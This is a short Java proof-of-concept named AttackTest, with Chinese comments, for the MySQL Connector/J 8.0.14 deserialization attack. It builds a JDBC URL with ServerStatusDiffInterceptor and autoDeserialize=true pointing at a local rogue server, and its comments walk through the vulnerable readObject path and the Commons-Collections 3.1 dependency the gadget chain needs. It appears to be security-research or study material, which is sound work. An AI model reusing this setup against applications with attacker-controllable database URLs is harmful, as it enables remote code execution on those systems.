package org.example.jdbc;

import java.sql.Connection;
import java.sql.DriverManager;

public class AttackTest {
        public static void main(String[] args) throws Exception {
            //驱动
            String driver = "com.mysql.cj.jdbc.Driver";

            //8.x使用--链接字符串
            String DB_URL = "jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
            //queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true这一段，不同的版本页不一样
            //加载mysql驱动
            Class.forName(driver);
            //链接mysql
            Connection conn = DriverManager.getConnection(DB_URL, "root", "123456");
            //这里实现序列化，采用的是cc链。所以，如果要实现效果，需要依赖阿帕奇的commons-Collections包
            /**
             * 利用场景--
             * 1、mysql-url地址可控
             * 2、待定
             *
             * 包根据自己不同的攻击链选择。mysql驱动版本使用的是8.x--》8.0.14
             * 以上环境均已具备，现在开始执行链接数据库操作
             * com.mysql.cj.jdbc.result.ResultSetImpl#getObject(int)  这里进入触发漏洞的地方。
             *  case BLOB: 二进制
             *                 if (field.isBinary() || field.isBlob()) {
             *                     byte[] data = getBytes(columnIndex);
             *
             *                     if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) {
             *                         Object obj = data;
             *
             *                         if ((data != null) && (data.length >= 2)) {
             *                             if ((data[0] == -84) && (data[1] == -19)) {
             *                                 // Serialized object?
             *                                 try {
             *                                     ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
             *                                     ObjectInputStream objIn = new ObjectInputStream(bytesIn);
             *                                     obj = objIn.readObject();  //这里进行反序列化出了对象
             *                                     objIn.close();
             *                                     bytesIn.close();
             *  <dependency>
             *             <groupId>commons-collections</groupId>
             *             <artifactId>commons-collections</artifactId>
             *             <version>3.1</version>
             *         </dependency>
             *          <dependency>
             *             <groupId>mysql</groupId>
             *             <artifactId>mysql-connector-java</artifactId>
             *             <scope>runtime</scope>
             *             <version>8.0.14</version>
             *         </dependency>
             */
        }
}
